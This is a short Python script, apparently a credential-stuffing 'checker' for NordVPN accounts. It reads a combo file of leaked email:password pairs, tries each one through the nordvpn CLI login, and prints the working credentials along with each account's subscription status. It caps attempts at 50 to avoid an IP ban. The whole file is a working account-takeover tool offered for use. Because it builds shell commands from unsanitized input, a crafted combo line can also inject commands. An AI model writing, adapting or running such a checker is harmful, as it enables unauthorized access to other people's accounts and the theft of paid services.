import os
import subprocess
import time

handle = open('your-email-pass-file.txt')    # import your combo file (email:pass)

count = 0 
for line in handle:
    count += 1
    user , pas = line.strip().split(':')    # your combo file must be separated by colon : 
    res  = os.system('nordvpn login -u {} -p {}'.format(user,pas))
    info = None

    if res == 0:  # 0 means that there is no error
        info = str(subprocess.check_output(['nordvpn','account'],encoding='437'))
        info = info.split('Account Information:')[1]
        info = info.split('Email Address: ')[1]
        email , info = info.split('VPN Service: ')
        print(str(count)+'-' ,user+':'+pas+'\t'+info)
        os.system('nordvpn logout')
        print()

    else:
        print(str(count)+'- '+user+':'+pas+'\t'+str(info)+'\n')

    if count == 50: # you can change the count but almost after 50 try your IP will ban from Nord servers
        handle.close()
        print(f"We reached to {count} login")
        exit()
        
